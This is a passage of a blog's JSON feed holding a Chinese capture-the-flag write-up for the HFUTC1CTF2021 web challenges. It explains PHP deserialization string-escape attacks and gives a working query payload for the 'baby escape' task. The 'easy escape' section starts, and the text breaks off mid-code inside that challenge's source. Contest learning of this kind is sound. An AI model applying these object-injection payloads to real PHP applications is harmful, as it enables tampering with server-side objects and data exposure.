{
    "version": "https://jsonfeed.org/version/1",
    "title": "dpm12345 • All posts by \"笔记\" tag",
    "description": "学习记录",
    "home_page_url": "http://dpm12345.github.io",
    "items": [
        {
            "id": "http://dpm12345.github.io/posts/d762243c/",
            "url": "http://dpm12345.github.io/posts/d762243c/",
            "title": "HFUTC1CTF2021",
            "date_published": "2022-07-23T12:10:32.000Z",
            "content_html": "<h1 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> Web</h1>\n<h2 id=\"warmup\"><a class=\"anchor\" href=\"#warmup\">#</a> warmup</h2>\n<h2 id=\"version\"><a class=\"anchor\" href=\"#version\">#</a> version</h2>\n<h2 id=\"baby-escape\"><a class=\"anchor\" href=\"#baby-escape\">#</a> baby escape</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Foo</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'nonono'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$k</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">key</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$k</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$k</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'k'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$k</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$foo</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Foo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$k</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'HFUT'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'C1CTF_IS_FUN'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$foo</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token variable\">$foo_ultimate</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$msg</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$foo_ultimate</span><span class=\"token operator\">-></span><span class=\"token property\">test</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'C1CTF_IS_FUN'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"what are you doing??\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>很明显为反序列化字符串逃逸 4--&gt;12，增加了 8 个字符 将最后的代码放到网页文件跑一下就行</p>\n<p>由于 <code>test</code>  在 <code>key</code> ，那么必然要提前闭合，在之前就序列化 <code>test</code>  的值</p>\n<p>所以 <code>key</code>  的后半部分必为 <code>s:4:&quot;test&quot;;s:12:&quot;C1CTF_IS_FUN&quot;;&#125;</code></p>\n<p>先进行上述字符串的序列化，得到</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Foo\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"key\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">32</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"s:4:\"</span>test<span class=\"token string double-quoted-string\">\";s:12:\"</span><span class=\"token constant\">C1CTF_IS_FUN</span><span class=\"token string double-quoted-string\">\";&#125;\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"nonono\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>计算 <code>key</code>  的值的前引号后第一个 (即 <code>s</code> ) 到第一个 <code>&#125;</code>  的长度，为 32 ，恰好为 4 个 8，但由于需要闭合前一个引号，故总共为 34 个字符（闭合引号，分号)</p>\n<p>所以需要 5 个 <code>HUFT</code> ，为了匹配，可在 <code>&#125;</code>  后加 6 个字符 (因为已经提前结束，无影响)</p>\n<p>故 payload 为</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>k&#x3D;HFUTHFUTHFUTHFUTHFUT&quot;;s:4:&quot;test&quot;;s:12:&quot;C1CTF_IS_FUN&quot;;&#125;;;;;;;</pre></td></tr></table></figure><h2 id=\"easy-escape\"><a class=\"anchor\" href=\"#easy-escape\">#</a> easy escape</h2>\n<p>最后构造的两个类为</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$foo1</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Foo4</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"C1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUN\"</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'\";s:1:\"a\";s:0:\"\";s:4:\"test\";s:4:\"HFUT\";s:1:\"b\";s:0:\"\";&#125;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$foo2</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Foo4</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"C1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUN\"</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'\";s:4:\"test\";s:4:\"HFUT\";s:1:\"b\";s:0:\"\";s:5:\"space\";s:0:\"\";&#125;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>源代码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Foo1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$space</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'nonono'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Foo2</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'nonono'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$space</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Foo3</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$space</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'nonono'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Foo4</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'nonono'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$space</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token variable\">$a1</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token variable\">$b1</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token variable\">$a2</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token variable\">$b2</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token variable\">$choice1</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"Foo1\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token variable\">$choice2</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"Foo1\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"choice1\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"choice2\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token variable\">$choice1</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"choice1\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token variable\">$choice2</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"choice2\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$choice1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token string double-quoted-string\">\"Foo1\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>            <span class=\"token variable\">$foo1</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Foo1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a1</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$b1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token string double-quoted-string\">\"Foo2\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>            <span class=\"token variable\">$foo1</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Foo2</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a1</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$b1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token string double-quoted-string\">\"Foo3\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>            <span class=\"token variable\">$foo1</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Foo3</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a1</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$b1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token string double-quoted-string\">\"Foo4\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>            <span class=\"token variable\">$foo1</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Foo4</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a1</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$b1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>        <span class=\"token keyword\">default</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>            <span class=\"token variable\">$foo1</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Foo1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a1</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$b1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>    <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$choice2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token string double-quoted-string\">\"Foo1\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>            <span class=\"token variable\">$foo2</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Foo1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a2</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$b2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token string double-quoted-string\">\"Foo2\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>            <span class=\"token variable\">$foo2</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Foo2</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a2</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$b2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token string double-quoted-string\">\"Foo3\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>            <span class=\"token variable\">$foo2</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Foo3</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a2</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$b2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token string double-quoted-string\">\"Foo4\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>            <span class=\"token variable\">$foo2</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Foo4</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a2</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$b2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>        <span class=\"token keyword\">default</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>            <span class=\"token variable\">$foo2</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token 